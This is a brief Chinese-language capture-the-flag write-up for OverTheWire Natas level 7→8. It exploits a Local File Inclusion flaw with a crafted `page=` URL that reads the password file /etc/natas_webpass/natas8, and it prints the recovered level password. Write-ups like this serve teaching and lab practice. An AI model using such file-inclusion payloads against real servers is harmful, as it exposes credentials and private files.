# Natas Level 7 → 8

## 目標
頁面用 `?page=` 參數載入內容，利用 LFI 讀取任意檔案。

## 解題過程

點 Home/About 連結後網址變成：
```
http://natas7.natas.labs.overthewire.org/index.php?page=home
http://natas7.natas.labs.overthewire.org/index.php?page=about
```

`page` 參數直接傳給 PHP `include()`，沒有驗證。直接塞入密碼路徑：
```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

## 關鍵概念

- **Local File Inclusion (LFI)**：用戶輸入直接傳給 `include()`，可讀取伺服器任意檔案
- Natas 密碼統一放在 `/etc/natas_webpass/natas<N>`
- 應使用白名單驗證 page 參數，只允許特定值

## 密碼
`xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
